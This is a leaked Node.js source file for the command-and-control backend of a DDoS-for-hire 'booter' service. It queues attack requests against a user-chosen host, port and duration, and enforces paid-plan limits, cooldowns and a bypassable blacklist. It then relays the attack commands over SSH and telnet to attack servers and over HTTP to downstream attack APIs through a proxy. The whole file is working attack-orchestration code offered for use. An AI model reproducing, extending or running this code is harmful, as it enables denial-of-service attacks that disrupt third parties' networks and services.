// Leaked by Dstat.ST & Elitestress.st :)
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const net = require('net');
const { ProxyAgent } = require('proxy-agent');
const { Client } = require('ssh2');

if (typeof __dirname === 'undefined') global.__dirname = path.resolve();

eval(fs.readFileSync(path.join(__dirname, './utils/Info.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/AsyncQueue.js'), 'utf8'));

const blacklist = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/blacklist.json')));
const config = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/main.json')));
const agent = new ProxyAgent('http://proxy.zopz-api.com:3128');
const activeGroupSlots = {};

// Get ASN (Autonomous System Number) for an IP address
async function getASN(ip) {
  try {
    const response = await axios.get('https://zopzsniff.xyz/geoip/' + ip);
    const asn = response.data?.asn?.asn;
    return asn ? 'ASnumber: AS' + asn : null;
  } catch (err) {
    console.error('Error fetching ASN for IP ' + ip + ':', err.message);
    return null;
  }
}

// Check if a group slot is available
function canUseGroupSlot(groupName, maxSlots) {
  if (!activeGroupSlots[groupName]) activeGroupSlots[groupName] = 0;
  return activeGroupSlots[groupName] < maxSlots;
}

// Mark a group slot as used
function markGroupSlotUsed(groupName) {
  activeGroupSlots[groupName] = (activeGroupSlots[groupName] || 0) + 1;
}

// Release a group slot
function releaseGroupSlot(groupName) {
  if (activeGroupSlots[groupName]) {
    activeGroupSlots[groupName]--;
    if (activeGroupSlots[groupName] <= 0) delete activeGroupSlots[groupName];
  }
}

class ApiHandler {
  constructor() {
    this.methods = this.loadmethods();
    this.activeAttacks = new Map();
    this.cooldowns = new Map();
    this.userQueues = new Map();
    this.watchMethodFile();
  }

  // Get or create a user queue
  getUserQueue(username) {
    if (!this.userQueues.has(username)) this.userQueues.set(username, new AsyncQueue());
    return this.userQueues.get(username);
  }

  // Main request processing logic
  async processRequest(methodName, params, user) {
    // Validate IPv4 address
    function isIPv4(str) {
      if (typeof str !== 'string') return false;
      const parts = str.split('.');
      if (parts.length !== 4) return false;
      return parts.every(part => {
        const num = Number(part);
        return part.match(/^\d+$/) && num >= 0 && num <= 255;
      });
    }
    // Extract domain from URL or string
    function getDomainFromUrl(str) {
      try {
        let urlStr = str;
        if (!str.startsWith('http')) urlStr = 'http://' + str;
        const urlObj = new URL(urlStr);
        return urlObj.hostname.toLowerCase();
      } catch {
        return null;
      }
    }
    // Validate number in range
    function isNumberInRange(val, min, max) {
      const num = Number(val);
      return Number.isInteger(num) && num >= min && num <= max;
    }

    return await this.getUserQueue(user.username).enqueue(async () => {
      if (!this.methods || typeof this.methods !== 'object') {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: attack methods not loaded');
        return { error: 'attack methods not loaded\r' };
      }
      console.log('[Queue] Processing request for user: ' + user.username);
      const method = this.methods[methodName.toLowerCase()];
      if (!method || !method.enabled) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Method ' + methodName + ' not found or disabled');
        return { error: 'Method ' + methodName + ' not found or disabled\r' };
      }
      if (method.group) {
        const group = config.attack_settings.method_groups.find(g => g.name === method.group);
        if (group) {
          const groupName = group.name;
          const maxSlots = group.max_slots;
          if (!canUseGroupSlot(groupName, maxSlots)) {
            console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: group ' + groupName + ' slots full');
            return { error: `The "${groupName}" methods group max attack slots are used (${maxSlots}).\r` };
          }
          markGroupSlotUsed(groupName);
          const attackTime = parseInt(params.time, 10);
          if (isNaN(attackTime) || attackTime <= 0) {
            console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Invalid attack time');
            releaseGroupSlot(groupName);
            return { error: 'Invalid attack time specified.\r' };
          }
          setTimeout(() => {
            releaseGroupSlot(groupName);
          }, attackTime * 1000);
        }
      }
      if (!params || typeof params !== 'object' || !params.host) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Invalid parameters');
        return { error: 'Invalid parameters\r' };
      }
      let hostTrimmed = params.host.trim();
      let hostNoProto = hostTrimmed.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      const hasIp = Object.prototype.hasOwnProperty.call(method, 'ip_address');
      const hasUrl = Object.prototype.hasOwnProperty.call(method, 'url');
      if (hasIp || hasUrl) {
        const allowIp = method.ip_address === true;
        const allowUrl = method.url === true;
        const isIp = isIPv4(hostNoProto);
        const isDomain = !isIp && (() => {
          try {
            const urlObj = new URL(hostTrimmed.startsWith('http') ? hostTrimmed : 'http://' + hostTrimmed);
            return !!urlObj.hostname;
          } catch {
            return false;
          }
        })();
        if (!allowIp && isIp) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: IP not allowed');
          return { error: 'Invalid target. This method does not allow IP addresses.\r' };
        }
        if (!allowUrl && isDomain) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: URL not allowed');
          return { error: 'Invalid target. This method does not allow URLs/domains.\r' };
        }
        if (!isIp && !isDomain) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Invalid target format');
          return { error: 'Invalid target. Not a valid IP or domain.\r' };
        }
      }
      if (isIPv4(hostNoProto)) {
        if (blacklist.ip_address.includes(hostNoProto) && !user.blacklistbypass) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Blacklisted IP ' + hostNoProto);
          return { error: `Host "${hostNoProto}" is blacklisted\r` };
        }
        if (!isNumberInRange(params.port, 1, 65535)) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Invalid port');
          return { error: 'Invalid port number\r' };
        }
      } else {
        if (method.url === false) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: URL not allowed but got domain');
          return { error: 'Invalid target. This method does not allow URLs/domains.\r' };
        }
        const domain = getDomainFromUrl(params.host);
        if (!domain) {
          console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Invalid domain');
          return { error: 'Invalid domain\r' };
        }
        if (!user.blacklistbypass) {
          if (blacklist.domain[domain]) {
            console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Blacklisted domain ' + params.host);
            return { error: `Host "${params.host}" is blacklisted\r` };
          }
          for (const tld of blacklist.domain_type) {
            if (domain.endsWith(tld)) {
              console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Blocked domain type');
              return { error: 'Target domain type is blocked\r' };
            }
          }
        }
      }
      const asn = await getASN(params.host);
      if (asn && blacklist.asn.includes(asn) && !user.blacklistbypass) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Blacklisted ASN ' + asn + ' for IP ' + params.host);
        return { error: `Target ASN (${asn}) is blacklisted\r` };
      }
      if (!isNumberInRange(params.time, 1, user.maxTime)) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Invalid time');
        return { error: `Time must be between 1 and ${user.maxTime} seconds\r` };
      }
      if (params.time > method.maxTime) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Time exceeds max allowed');
        return { error: `Time exceeds maximum allowed (${method.maxTime}s)\r` };
      }
      if (params.time < method.min_time) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Time below min allowed');
        return { error: `Time below minimum allowed (${method.min_time}s)\r` };
      }
      if (method.vip && !user.vip) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: User lacks VIP');
        return { error: 'User doesn’t have VIP network!!\r' };
      }
      if (method.homeholder && !user.homeholder) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: User lacks Home Holder');
        return { error: 'User doesn’t have Home Holder network!!\r' };
      }
      if (method.botnet && !user.botnet) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: User lacks botnet');
        return { error: 'User doesn’t have botnet network!!\r' };
      }
      const cooldown = this.isOnCooldown(user.username, methodName);
      if (cooldown) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Cooldown ' + cooldown.remaining + 's');
        return { error: `Cooldown active for ${methodName}. ${cooldown.remaining}s remaining\r` };
      }
      const duplicateAttack = [...this.activeAttacks.values()].find(
        a => a.username === user.username && a.params.host === params.host
      );
      if (duplicateAttack && !user.spambypass) {
        const remaining = Math.ceil((duplicateAttack.startTime + duplicateAttack.params.time * 1000 - Date.now()) / 1000);
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Duplicate attack (' + remaining + 's remaining)');
        return { error: `Ongoing attack to ${params.host} in progress. ${remaining}s remaining\r` };
      }
      const concurrentMethod = [...this.activeAttacks.values()].filter(
        a => a.username === user.username && a.method === methodName
      ).length;
      if (concurrentMethod >= method.maxConcurrents) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Too many concurrent ' + methodName);
        return { error: `Maximum concurrent reached (${method.maxConcurrents}) for ${methodName}\r` };
      }
      const concurrentTotal = [...this.activeAttacks.values()].filter(
        a => a.username === user.username
      ).length;
      if (concurrentTotal >= user.concurrents) {
        console.log('[Queue] Failed request for user: ' + user.username + ' - Reason: Too many total concurrents');
        return { error: `Maximum concurrent reached (${user.concurrents}) for ${user.username}\r` };
      }
      const requestId = Date.now().toString() + Math.random().toString(36).slice(2, 15);
      this.activeAttacks.set(requestId, {
        id: requestId,
        username: user.username,
        method: methodName,
        params,
        startTime: Date.now()
      });
      setTimeout(() => this.activeAttacks.delete(requestId), params.time * 1000);
      this.setCooldown(user, methodName, params.time);
      this.sendServerCommand(methodName, params).catch(e => console.error('ServerCmd Error:', e));
      this.sendApiCommand(methodName, params).catch(e => console.error('ApiCmd Error:', e));
      const targetDetails = (await globalThis.getTargetDetails?.(params.host)) || {};
      console.log('[Queue] Successful request for user: ' + user.username);
      return {
        success: true,
        requestId,
        target: {
          host: params.host,
          port: params.port,
          duration: params.time,
          method: methodName,
          time_sent: new Date().toISOString(),
          ...targetDetails
        }
      };
    });
  }

  // Send a command to all servers for a method
  async sendServerCommand(methodName, params) {
    let successCount = 0;
    const method = this.methods?.[methodName];
    if (!method || !Array.isArray(method.servers)) return successCount;
    const session = params.host.replace(/\./g, '');
    // Telnet/SSH protocol constants
    const IAC = 0xff, DO = 0xfd, DONT = 0xfe, WILL = 0xfb, WONT = 0xfc;
    const serverPromises = method.servers.map(server => new Promise(resolve => {
      // Replace placeholders in command
      const command = server.command.replace(/\{\{(\w+)\}\}/g, (m, key) => ({
        session,
        host: params.host,
        port: params.port,
        time: params.time,
        len: params.len
      })[key] || '');
      console.log(`[${server.name}] Executing command: ${command}`);
      const ports = Array.isArray(server.port) ? server.port : [server.port || (server.type === 'telnet' ? params.port : 22)];
      // Try each port in order
      const tryPort = portIdx => {
        if (portIdx >= ports.length) {
          console.error(`[${server.name}] All ${server.type || 'ssh'} port attempts failed`);
          return resolve(false);
        }
        const port = ports[portIdx];
        if (server.type === 'telnet') {
          const socket = new net.Socket();
          let connected = false, sentUser = false, sentPass = false, sentCaptcha = false, sentCommand = false;
          const cleanup = () => { socket.removeAllListeners(); socket.destroy(); };
          const globalTimeout = setTimeout(() => {
            console.error(`[${server.name}] Telnet global timeout on port ${port}`);
            cleanup();
            tryPort(portIdx + 1);
          }, 10000);
          socket.setNoDelay(true);
          socket.setTimeout(5000);
          socket.connect(port, server.host, () => {
            connected = true;
            console.log(`[${server.name}] Telnet connected on port ${port}`);
            socket.write('\r\n');
          });
          socket.on('data', data => {
            let i = 0;
            while (i < data.length && data[i] === IAC && i + 2 < data.length) {
              const cmd = data[i + 1], opt = data[i + 2];
              if (cmd === DO) socket.write(Buffer.from([IAC, WONT, opt]));
              if (cmd === WILL) socket.write(Buffer.from([IAC, DONT, opt]));
              i += 3;
            }
            const str = data.slice(i).toString('utf8').replace(/\u001b\[[0-9;]*[A-Za-z]/g, '').replace(/\u001b\][^\u0007]*\u0007/g, '');
            if (sentCommand) {
              console.log(`[${server.name}] ↩ ${str.trimEnd()}`);
              cleanup();
              clearTimeout(globalTimeout);
              return resolve(true);
            }
            if (!sentUser && str.includes('Username:')) { socket.write(server.username + '\r\n'); sentUser = true; }
            else if (!sentPass && sentUser && str.includes('Password:')) { socket.write(server.password + '\r\n'); sentPass = true; }
            else if (!sentCaptcha && sentPass && /Captcha/i.test(str)) { socket.write((params.captcha || server.captcha) + '\r\n'); sentCaptcha = true; }
            else if (!sentCommand && (str.endsWith('> ') || str.endsWith('$ ') || str.endsWith('\r\n'))) { socket.write(command + '\r\n'); sentCommand = true; }
          });
          socket.on('timeout', () => {
            console.error(`[${server.name}] Telnet timeout on port ${port}`);
            cleanup();
            clearTimeout(globalTimeout);
            tryPort(portIdx + 1);
          });
          socket.on('error', err => {
            console.error(`[${server.name}] Telnet error on port ${port}: ${err.message}`);
            cleanup();
            clearTimeout(globalTimeout);
            tryPort(portIdx + 1);
          });
          socket.on('close', hadError => {
            clearTimeout(globalTimeout);
            cleanup();
            if (connected && !hadError) {
              console.log(`[${server.name}] Telnet session closed`);
              resolve(true);
            } else if (!hadError) {
              tryPort(portIdx + 1);
            } else {
              resolve(false);
            }
          });
        } else {
          // SSH
          const ssh = new Client();
          let globalTimeout = setTimeout(() => {
            console.error(`[${server.name}] SSH global timeout on port ${port}`);
            ssh.end();
            resolve(false);
          }, 10000);
          ssh.on('ready', () => {
            ssh.exec(command, (err, stream) => {
              if (err) {
                console.error(`[${server.name}] SSH Exec Error: ${err.message}`);
                ssh.end();
                clearTimeout(globalTimeout);
                return resolve(false);
              }
              stream.on('close', () => {
                ssh.end();
                clearTimeout(globalTimeout);
                resolve(true);
              }).on('data', data => {
                console.log(`[${server.name}] STDOUT: ${data.toString().trim()}`);
              }).stderr.on('data', data => {
                console.error(`[${server.name}] STDERR: ${data.toString().trim()}`);
              });
            });
          }).on('error', err => {
            console.error(`[${server.name}] SSH Connection Error on port ${port}: ${err.message}`);
            clearTimeout(globalTimeout);
            tryPort(portIdx + 1);
          }).on('end', () => {
            clearTimeout(globalTimeout);
          }).connect({
            host: server.host,
            port,
            username: server.username,
            password: server.password
          });
        }
      };
      tryPort(0);
    }));
    const results = await Promise.allSettled(serverPromises);
    successCount = results.filter(r => r.status === 'fulfilled' && r.value === true).length;
    return successCount;
  }

  // Send API command to all URLs for a method
  async sendApiCommand(methodName, params) {
    let successCount = 0;
    const method = this.methods?.[methodName];
    if (!method || !Array.isArray(method.urls)) return successCount;
    const { urls, error } = this.generateApiUrls(methodName, params);
    if (error) return 0;
    for (const url of urls) {
      const start = Date.now();
      try {
        const response = await axios.get(url, {
          httpAgent: agent,
          httpsAgent: agent,
          timeout: 10000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (ZOPZ CNC) V4',
            'Accept': '*/*',
            'Connection': 'keep-alive'
          }
        });
        const elapsed = Date.now() - start;
        console.log(`--- API Response (${response.status === 200 ? 'Success' : 'Failure'}) ---`);
        console.log('URL:', url);
        console.log('Status:', response.status, response.statusText);
        console.log('Body:', response.data);
        if (response.status === 200) successCount++;
      } catch (err) {
        const elapsed = Date.now() - start;
        console.error('--- API Request Failed ---');
        console.error('URL:', url);
        console.error('Error:', err.message);
        if (axios.isCancel(err)) console.error('Request was canceled');
        if (err.response) {
          console.error('Status:', err.response.status);
          console.error('Body:', err.response.data);
        }
      }
    }
    return successCount;
  }

  // Utility: Validate IPv4 address
  isValidIp(ip) {
    return /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)$/.test(ip);
  }

  // Utility: Validate number in range
  isValidNumber(val, min, max) {
    const num = Number(val);
    return Number.isInteger(num) && num >= min && num <= max;
  }

  // Utility: Extract domain from URL
  getDomain(str) {
    try {
      const urlObj = new URL(str);
      return urlObj.hostname;
    } catch {
      return null;
    }
  }

  // Cooldown check
  isOnCooldown(username, methodName) {
    const key = username + ':' + methodName;
    const cooldown = this.cooldowns.get(key);
    if (!cooldown) return false;
    const now = Date.now();
    if (now < cooldown.endTime) {
      return { remaining: Math.ceil((cooldown.endTime - now) / 1000) };
    }
    this.cooldowns.delete(key);
    return false;
  }

  // Set cooldown
  setCooldown(user, methodName, duration) {
    if (user.cooldown == 0) return;
    const key = user.username + ':' + methodName;
    const endTime = Date.now() + (duration + user.cooldown) * 1000;
    this.cooldowns.set(key, { endTime });
  }

  // Generate API URLs for a method
  generateApiUrls(methodName, params) {
    const method = this.methods[methodName];
    if (!method || !method.enabled) {
      return { error: `Endpoint "${methodName}" not found or disabled` };
    }
    const { urls, maxConcurrents } = method;
    const urlList = urls.map(u =>
      u.url
        .replace('{host}', encodeURIComponent(params.host))
        .replace('{port}', encodeURIComponent(params.port))
        .replace('{time}', encodeURIComponent(params.time))
    );
    return { urls: urlList, maxConcurrents };
  }

  // Load methods from file
  loadmethods() {
    this.methods = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/methods.json')));
  }

  // Watch config files for changes
  watchMethodFile() {
    const files = [
      { name: 'methods.json', target: 'methods' },
      { name: 'blacklist.json', target: 'blacklist' },
      { name: 'plans.json', target: 'plans' }
    ];
    files.forEach(({ name, target }) => {
      const filePath = path.join(__dirname, './configs/', name);
      let lastContent = '';
      fs.watchFile(filePath, { interval: 1000 }, (curr, prev) => {
        if (curr.mtime === prev.mtime) return;
        fs.readFile(filePath, 'utf8', (err, content) => {
          if (err) return console.error('Failed to read ' + name + ':', err.message);
          if (content === lastContent) return;
          try {
            const parsed = JSON.parse(content);
            this[target] = parsed;
            lastContent = content;
            console.log(name + ' reloaded successfully');
          } catch (e) {
            console.error('Invalid JSON in ' + name + ', ignoring update:', e.message);
          }
        });
      });
    });
  }
}

globalThis.ApiHandler = ApiHandler;